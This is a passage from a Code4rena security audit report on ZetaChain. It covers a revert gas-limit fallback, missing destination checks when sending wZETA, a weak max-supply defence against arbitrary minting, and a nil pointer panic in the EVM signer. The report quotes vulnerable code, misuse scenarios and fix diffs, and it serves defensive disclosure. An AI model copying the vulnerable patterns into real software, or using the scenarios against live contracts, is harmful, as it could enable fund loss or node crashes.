Aborted if revert is not possible. The CCTX processing is completed if it
goes to Aborted status.
10. If the new status is “PendingRevert”, a second OutboundTxParams should be
already in the CCTX, which instructs the zetaclients to create a “Revert” outbound tx to the incoming chain & contract, allowing the incoming contract to
implement a application level revert function to cleanup contract state.
11. The zetaclients will build the revert transaction, enter into TSS keysign ceremony to sign the transaction, and broadcast to the incoming blockchain (Chain
A in this case).
12. Once the revert transaction is “confirmed” on Chain A, the zetaclients will
report the transaction status to zetacore.
13. If the revert transaction is successful, the CCTX status becomes Reverted, and
the CCTX processing is completed.
14. If the revert transaction is failure, the CCTX status becomes Aborted, and the
CCTX processing is completed.

### Recommended Mitigation Steps

`GetRevertGasLimit` is called in two places as follow. The comment `fallback -- should not happen` is actually true for `InboundTx`, it's a dead code path. On the other hand, it's an active path for `OutboundTx` and cause this high severity report.

**VoteOnObservedInboundTx**

I would recommend to remove the `dead code path` and have no fallback, the code path is anyway dead, so keeping it there make the code more vulnerable.

```diff
	gasLimit, err := k.GetRevertGasLimit(ctx, cctx)
-	if err != nil {
+	if err != nil || gasLimit == 0 {
	    cctx.CctxStatus.ChangeStatus(types.CctxStatus_Aborted, "can't get revert tx gas limit"+err.Error())
	    return &types.MsgVoteOnObservedInboundTxResponse{}, nil
	}
-	if gasLimit == 0 {
-    	    // use same gas limit of outbound as a fallback -- should not happen
-	    gasLimit = msg.GasLimit
-	}
```

**VoteOnObservedOutboundTx**

 I understand that this will also impact the Inbound flow, but seems a noop as a failure in `k.HandleEVMDeposit` will always return isContractReverted false which would not reach this code path.

```
func (k Keeper) GetRevertGasLimit(ctx sdk.Context, cctx types.CrossChainTx) (uint64, error) {
	if cctx.InboundTxParams == nil {
		return 0, nil
	}

-	if cctx.InboundTxParams.CoinType == common.CoinType_Gas {
+	if cctx.InboundTxParams.CoinType == common.CoinType_Gas || cctx.InboundTxParams.CoinType == common.CoinType_Zeta {
		// get the gas limit of the gas token
		fc, found := k.fungibleKeeper.GetGasCoinForForeignCoin(ctx, cctx.InboundTxParams.SenderChainId)
		if !found {
			return 0, types.ErrForeignCoinNotFound
		}
		gasLimit, err := k.fungibleKeeper.QueryGasLimit(ctx, ethcommon.HexToAddress(fc.Zrc20ContractAddress))
		if err != nil {
			return 0, errors.Wrap(fungibletypes.ErrContractCall, err.Error())
		}
		return gasLimit.Uint64(), nil
	} else if cctx.InboundTxParams.CoinType == common.CoinType_ERC20 {
		// get the gas limit of the associated asset
```

```
	gasLimit, err := k.GetRevertGasLimit(ctx, cctx)
	if err != nil || gasLimit == 0 {
    	   return errors.New("can't get revert tx gas limit" + err.Error())
	}
-	if gasLimit == 0 {
-	   // use same gas limit of outbound as a fallback -- should not happen
-	   gasLimit = cctx.OutboundTxParams[0].OutboundTxGasLimit
-	}
```

## [[24] Missing key protection against the Zeta token contract when withdrawing wZETA](https://github.com/code-423n4/2023-11-zetachain-findings/issues/268)
*Note: At the judge’s request [here](https://github.com/code-423n4/2023-11-zetachain-findings/issues/164#issuecomment-1906690237), this downgraded issue from the same warden has been included in this report for completeness.*

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/x/crosschain/keeper/evm_hooks.go#L209

There are 2 ways to send ZETA token through the Zeta protocol.
1. calling `send` function from the external supported EVM `ZetaConnector*` contracts (it's an ERC20 on those external chain)
2. calling `send` function from Zetachain `ZetaConnectorZEVM` by transfering wZETA.

The first (and probably the most used) use case is having a [specific protection](https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/utils.go#L153-L156) in order to prevent ZETA token to be transfered to the ERC20 ZETA token contract itself on the receiver external chain, as it doesn't make sense for this contract to owns any ZETA.
```
   if strings.EqualFold(destAddr, cfgDest.ZetaTokenContractAddress) {
	ob.logger.ExternalChainWatcher.Warn().Msgf("potential attack attempt: %s destination address is ZETA token contract address %s", destChain, destAddr)
        return types.MsgVoteOnObservedInboundTx{}, fmt.Errorf("potential attack attempt: %s destination address is ZETA token contract address %s", destChain, destAddr)
   }
```

Unfortunatelly, the second mechanism doesn't provide such protection, which seems to warrant `Medium` severity.

### Impact

ZETA token can be transfered to any EVM supported chain ZETA ERC20 token contract (so the ZETA ERC20 token contract itself would own those ZETA afterward), which seems to be something that should not be possible and `breaking an invariant`.

### Proof of Concept

The following scenario would be possible with the lack of the missing protection.

1. User owns 100 wZETA on Zetachain and wants to transfer those to Ethereum, he does that by calling `ZetaConnectorZEVM::send` with the following input data:
destinationChainId: 1 (For Ethereum)
destinationAddress: 0x5CDf9f824526Bf2A4638BF6879591F635Bb8f0B8 (Zeta.eth.sol already deployed on ETH mainnet)

2. This would transfer the corresponding wZETA to ZetaConnectorZEVM, unwrap them to get native ZETA and send those to FUNGIBLE_MODULE_ADDRESS. Still in the same transaction, it would emit `ZetaSent` event, which will be consummed by hook inside Zetacore node (in `ProcessZetaSentEvent`) and a CCTX will be created to get this transfered on the Ethereum chain if the CCTX is completed successfully.

3. Now 100 wZETA (minus gas fees for the entire CCTX) ERC20 on ETH mainet would be owning by the contract itself.

### Recommended Mitigation Steps

I would recommend the team to put the same protection for the second mechanism, so it's consistent and properly protected. Also validate `DestinationAddress` properly.

```diff
func (k Keeper) ProcessZetaSentEvent(ctx sdk.Context, event *connectorzevm.ZetaConnectorZEVMZetaSent, emittingContract ethcommon.Address, txOrigin string) error {
	if !k.zetaObserverKeeper.IsInboundEnabled(ctx) {
		return types.ErrNotEnoughPermissions
	}

        ...

	receiverChainID := event.DestinationChainId
	receiverChain := k.zetaObserverKeeper.GetParams(ctx).GetChainFromChainID(receiverChainID.Int64())
	if receiverChain == nil {
		return zetaObserverTypes.ErrSupportedChains
	}

	// Validation if we want to send ZETA to an external chain, but there is no ZETA token.
	coreParams, found := k.zetaObserverKeeper.GetCoreParamsByChainID(ctx, receiverChain.ChainId)
	if !found {
		return types.ErrNotFoundCoreParams
	}

+	toAddr, err := receiverChain.EncodeAddress(event.DestinationAddress)
+	if err != nil {
+		return fmt.Errorf("cannot encode address %s: %s", event.DestinationAddress, err.Error())
+	}
+
+       // The ZETA token itself cannot own any tokens, potential attack.
+	if strings.EqualFold(toAddr, coreParams.ZetaTokenContractAddress)) {
+		return types.ErrUnableToSendCoinType
+	}
	if receiverChain.IsExternalChain() && coreParams.ZetaTokenContractAddress == "" {
		return types.ErrUnableToSendCoinType
	}
-	toAddr := "0x" + hex.EncodeToString(event.DestinationAddress)
	senderChain := common.ZetaChain()
	amount := math.NewUintFromBigInt(event.ZetaValueAndGas)

        ...
```

## [[25] Comprehensive Defense Against Arbitrary Minting not properly implemented as claimed by the whitepaper](https://github.com/code-423n4/2023-11-zetachain-findings/issues/236)
*Note: At the judge’s request [here](https://github.com/code-423n4/2023-11-zetachain-findings/issues/164#issuecomment-1906690237), this downgraded issue from the same warden has been included in this report for completeness.*

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/zeta_supply_checker.go#L113-L116

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/protocol-contracts/contracts/evm/ZetaConnector.non-eth.sol#L16

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/protocol-contracts/contracts/evm/ZetaConnector.non-eth.sol#L69

The [whitepaper](https://www.zetachain.com/whitepaper.pdf) claim at `section 7.3` that the protocol implement a `defense mechanism` to prevent ZETA token to be inflated with invalid mint, such that the total supply cannot be inflated in case of bugs being exploited.

However, such mechanism is currently `only partially implemented` which seems to warrant `Medium` severity.

### Impact
Documentation claim is inaccurate and the Zeta platform cannot claim to have such `Comprehensive Defense Against Arbitrary Minting` mechanism in place in the moment.

### Proof of Concept

I would like to describe in more details what are the current weakness of the defense mechanism.

1. As indicated in another issue I've submitted titled `ZetaSupplyChecker could potentially cause Observer to panic and also erroneous calculate the totalspply`, ZetaSupplyChecker:
    - Can be inaccurate in his totalSupply calculation due to a bug
    - Is purelly `passive` in the moment as `CheckZetaTokenSupply` is only printing a log in case of error and `ValidateZetaSupply` return value (so if totalSupply is good or not) is not even consummed.
    - When the Observer starts, in case NewZetaSupplyChecker fails, the code execution will print a log and continue as is, making this feature a nice-to-have, but not mandatory (as it should be).

```
 zetaSupplyChecker, err := mc.NewZetaSupplyChecker(cfg, zetaBridge, masterLogger)
    if err != nil {
        startLogger.Err(err).Msg("NewZetaSupplyChecker")
    }
    if err == nil {
        zetaSupplyChecker.Start()
        defer zetaSupplyChecker.Stop()
    }
```

2. Supply check in connector contract is weak.
   - `ZetaConnectorNonEth::onReceive` is only checking against the totalSupply of the current external chain, not accounting for all the other supply available on other chains (which ZetaSupplyChecker try todo)
   - `maxSupply` is initialized with `maxSupply = 2 ** 256 - 1;` maximum uint256 value at contract deployment, and might not be set to a lower value later on (using setMaxSupply, and what would be this magic value?), which make this check useless if the maxSupply has not be overwritten afterwards. And I just checked on now (December 8th, 11h41 UTC-5) the [Mumbai's connector](https://mumbai.polygonscan.com/address/0x0000ecb8cdd25a18f12daa23f6422e07fbf8b9e1#readContract), and confirm that this is the case in the moment, maxSupply has not been overwritten yet (so still at `115792089237316195423570985008687907853269984665640564039457584007913129639935`, which expose this flaw.

```
    function onReceive(
        bytes calldata zetaTxSenderAddress,
        uint256 sourceChainId,
        address destinationAddress,
        uint256 zetaValue,
        bytes calldata message,
        bytes32 internalSendHash
    ) external override onlyTssAddress {
        if (zetaValue + ZetaNonEthInterface(zetaToken).totalSupply() > maxSupply) revert ExceedsMaxSupply(maxSupply);
        ZetaNonEthInterface(zetaToken).mint(destinationAddress, zetaValue, internalSendHash);

        if (message.length > 0) {
            ZetaReceiver(destinationAddress).onZetaMessage(
                ZetaInterfaces.ZetaMessage(zetaTxSenderAddress, sourceChainId, destinationAddress, zetaValue, message)
            );
        }

        emit ZetaReceived(zetaTxSenderAddress, sourceChainId, destinationAddress, zetaValue, message, internalSendHash);
    }
```

### Recommended Mitigation Steps

Remove such claim from the WhitePaper or complete the mechanism such that it work as described. If you want to complete it, I would suggest the following steps:
1. Fix the 3 weaknesses I described for `ZetaSupplyChecker`.
2. Fix the 2 weaknesses I described for `ZetaConnectorNonEth.sol`.
I would remove the maxSupply logic from the connector contract as a whole, right now it doesn't bring any value, and put all this inside the Observer code logic, such that before calling `onReceive` (SignOutboundTx) or `onRevert` (SignRevertTx), you add a check that communicate with `ZetaSupplyChecker` to see if this new supply can be minted, as this is the only place where you have the full picture of the totalsupply.

## [[26] Possible nil pointer dereference in multiple locations when calling crypto.SigToPub can cause panic](https://github.com/code-423n4/2023-11-zetachain-findings/issues/157)
*Note: At the judge’s request [here](https://github.com/code-423n4/2023-11-zetachain-findings/issues/164#issuecomment-1906690237), this downgraded issue from the same warden has been included in this report for completeness.*

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/evm_signer.go#L109-L113

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/evm_signer.go#L216-L220

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/evm_signer.go#L243-L247

https://github.com/code-423n4/2023-11-zetachain/blob/main/repos/node/zetaclient/evm_signer.go#L292-L296

`Observers` sign and send outbounds txs using `TryProcessOutTx` func as part of the Zeta protocol. As indicated in the lines above, there are 4 instances that do such task in an `unsafe way`, which can lead the program to panic.

```
	pubk, err := crypto.SigToPub(hashBytes, sig[:])
	if err != nil {
		signer.logger.Error().Err(err).Msgf("SigToPub error")
                //@audit : In case of error, pubk will always be nil, which will cause a panic on the next line
                // as trying to dereference a nil pointer
	}
	addr := crypto.PubkeyToAddress(*pubk)
        signer.logger.Info().Msgf("Sign: Ecrecovery of signature: %s", addr.Hex())
```

### Impact

`zetaclientd` will panic if such error scenario occurs, which will require a manual restart.

### Proof of Concept

This is so self-explanatory that I don't see how a PoC will give any values.

### Recommended Mitigation Steps

Granted that this scenario should be `very rare` as the input parameters of `crypto.SigToPub` have been created in the same function locally (not directly coming from an external party). Nevertheless, I feel this warrant a `Medium` severity as it would make the program to crash and there is no recovery in the moment implemented for this code path.

Since `addr` is only used to print a log, and since this should happen very rarely, I would recommend to make this trace optional as following:

```diff
	if err != nil {
		signer.logger.Error().Err(err).Msgf("SigToPub error")
-	}
+	} else {
+		addr := crypto.PubkeyToAddress(*pubk)
+		signer.logger.Info().Msgf("Sign: Ecrecovery of signature: %s", addr.Hex())
+	}
```

`Additionally`, as pointed in your previous audit and as you fixed in `btc_signer.go`, I would recommend to add a `panic recovery` also in `evm_signer.go` as follow. This is perfect pattern as `TryProcessOutTx` run in it's own go routine, and a bad handling should not crash the observer, which would happen unfortunatelly in the moment.

```diff
func (signer *EVMSigner) TryProcessOutTx(
	send *types.CrossChainTx,
	outTxMan *OutTxProcessorManager,
	outTxID string,
	evmClient ChainClient,
	zetaBridge ZetaCoreBridger,
	height uint64,
) {
	logger := signer.logger.With().
		Str("outTxID", outTxID).
		Str("SendHash", send.Index).
		Logger()
	logger.Info().Msgf("start processing outTxID %s", outTxID)
	logger.Info().Msgf("EVM Chain TryProcessOutTx: %s, value %d to %s", send.Index, send.GetCurrentOutTxParam().Amount.BigInt(), send.GetCurrentOutTxParam().Receiver)

	defer func() {
		outTxMan.EndTryProcess(outTxID)
+		if err := recover(); err != nil {
+			signer.logger.Error().Msgf("EVM TryProcessOutTx: %s, caught panic error: %v", send.Index, err)
+		}
	}()
```

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/164#issuecomment-1883601662)**

**[0xean (Judge) commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/164#issuecomment-1906690237):**
 > [01] - NC<br>
> [02] - NC<br>
> [03] - NC<br>
> [04] - NC<br>
> [05] - NC<br>
> [06] - L<br>
> [07] - NC<br>
> [08] - NC<br>
> [09] - NC<br>
> [10] - NC<br>
> [11] - NC<br>
> [12] - NC<br>
> [13] - NC<br>
> [14] - NC<br>
> [15] - L<br>
> [16] - NC<br>
> [17] - NC<br>
> [18] - L<br>
> [19] - NC<br>
> [20] - NC<br>
> [21] - NC<br>
> [22] - NC<br>
> [23] - L<br>
> [24] - L<br>
> [25] - L<br>
> [26] - L

***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
